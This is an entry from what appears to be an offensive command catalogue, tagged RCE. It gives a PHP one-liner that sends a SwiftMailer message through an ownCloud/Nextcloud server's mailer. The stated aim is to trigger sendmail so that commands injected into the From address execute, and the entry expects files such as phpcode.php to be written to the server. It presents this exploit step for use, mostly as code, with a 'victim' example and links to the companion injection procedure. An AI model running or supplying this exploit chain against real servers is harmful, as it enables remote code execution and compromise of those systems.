---
id: cmd-swiftmailer-send
data: >-
  $message->setTo(['lukas@cloud.wtf']); $message->setBody('foo','text/plain');
  \OC::$server->getMailer()->send($message);
tags:
  - rce
  - sendmail
type: command
output: null
executor: php
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:23.862Z'
verified: false
validated: true
submitted: true
---
# send-swiftmailer-message

## Command

```php
$message->setTo(['lukas@cloud.wtf']); $message->setBody('foo','text/plain'); \OC::$server->getMailer()->send($message);
```

## Description

This PHP command configures and sends a SwiftMailer message, triggering sendmail transport to execute any injected commands from the From address, resulting in RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setTo(array) | Sets recipient email array | Yes |
| setBody(string, string) | Sets message body and MIME type (e.g., 'text/plain') | Yes |
| send(Message) | Processes and sends the message via the transport | Yes |

## Examples

### Basic Usage

```php
$message->setTo(['lukas@cloud.wtf']); $message->setBody('foo','text/plain'); \OC::$server->getMailer()->send($message);
```

### Advanced Usage

```php
// With HTML body
$message->setTo(['victim@example.com']); $message->setBody('<p>Test</p>','text/html'); \OC::$server->getMailer()->send($message);
```

## Expected Output

Returns the number of recipients (e.g., 1) if successful. Side effects include file writes from injections; check server filesystem for new files like phpcode.php and sendmail logs for command execution.

## Related

- [[commands/create-swiftmailer-message-with-injection]]
- [[procedures/Trigger-Sendmail-Injection-via-Mailer]]
